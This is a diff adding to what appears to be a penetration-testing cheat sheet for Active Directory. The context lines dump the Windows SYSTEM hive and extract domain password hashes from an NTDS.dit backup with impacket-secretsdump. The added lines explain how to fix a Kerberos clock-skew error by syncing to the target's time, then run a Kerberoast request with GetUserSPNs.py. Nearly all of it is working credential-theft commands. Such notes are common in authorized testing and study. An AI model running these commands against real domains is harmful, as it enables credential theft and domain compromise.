@@ -1972,3 +1972,10 @@ reg.exe save hklm\system c:\system.bak
 impacket-secretsdump -ntds ntds.dit.bak -system system.bak LOCAL
 ```
 ---
+
+
+Fixing : Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+1. If you are not currently running as the root user, switch to the root user by running the “su” command
+2. Run “timedatectl set-ntp off” to disable the Network Time Protocol from auto-updating
+3. Run “rdate -n [IP of Target]” to match your date and time with the date and time of the your target machine
+4. Run your Kerberoast command (which should be GetUserSPNs.py [Domain Name].local/[username]:[password] -dc-ip [Domain Controller IP] -request)
